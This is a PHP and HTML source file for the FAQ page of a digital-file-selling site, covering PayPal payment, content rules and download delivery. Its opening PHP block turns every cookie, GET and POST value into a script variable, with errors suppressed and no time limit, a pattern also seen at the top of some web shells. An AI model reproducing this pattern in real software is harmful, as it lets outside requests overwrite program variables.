<?php
error_reporting(5);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}

@set_time_limit(0);
$tmp = array();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8;charset=utf-8" />
<title>Upload & Sell | An easy way to sell your files</title>
<meta name="keywords" content="upload, pdf, ebooks, ebook, sell, paypal, fast, quick, prodaja, digital, products, txt" />
<meta name="description" content="Upload-Sell.com provides an easy way to sell your files." />
<meta name="distribution" content="global" />
<meta name="robots" content="all" />

<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon" />
<link rel="stylesheet" href="css/masters.css" type="text/css" media="projection, screen" />
<link rel="stylesheet" href="css/print.css" type="text/css" media="print" />
<!--[if gte IE 6]><![if lt IE 7]>
<link rel="stylesheet" href="library/css/ie-fixes.css" type="text/css" media="projection, screen" />
<![endif]><![endif]-->

</head>

<body>
	<div id="wrapper">
		<div id="header">
			<div>
<h1><a href="http://upload-sell.com" title="Upload-Sell.com">Upload-Sell.com</a></h1>
                                <p>
						<a href="index.php" id="index">Home</a>
						<a href="faq.php" id="news">FAQ</a> 
						<a href="about.php" id="about">About</a>
						<a href="contact.php" id="contact">Contact us</a></p>
			</div>
		</div>
		<div id="column">
			<div id="about">
<div class="tutorijali">
<?php
echo "<h1><a href=\"/index.php\" class=\"tutorijal\">Upload System</a></h1><h5>Important informations about your upload.</h5>";
echo "<div class=\"divider\"></div><div class=\"about\"><br />";
?><h3><pre>
<h3><strong>I want to upload and sell a product - how and when will I be paid?</strong></h3>
When creating a product, you supply us with your Paypal email address. Your customers will be paying directly to you and the money 

goes straight into your Paypal account.
<br>
<h3><strong>Are they any restrictions or limitations to the product I upload?</strong></h3>
You are required to own the rights to sell the the products you upload to UPLOAD-SELL and that you are not in voilation of any 

copyrights laws. Furthermore, it is our policy that we do not accept products related and not limited to pornography, voilent, racial

intolerance or advocacy against any individual, group or organisation, excessive profinaty, hacking, cracking, gambling and casinos,

any other that is illegal, promotes illegal activity or infringes on the legal rights of others.
<br>
<h3><strong>Will you ever contact with my customers?</strong></h3>
In normal circumstances, we will never have direct communication with your customers. We will only contact your customers when

your customers contact us for support or technical issues and when required by law.
<br>
<h3><strong>How will my customers know where to download my products?</strong></h3>
After payment your buyer will be redirected to download link.
</pre></h3></div></div>.
                         </div>
			
			<div id="bottom"><p><a href=""></a></p></div>
		</div><!-- end #column -->
	
		<div id="footer">
			<div><center><p>Copyright &copy; 2011. All rights reserved.</p></center></div>
		</div>
	</div><!-- end #wrapper -->
</body>
</html>
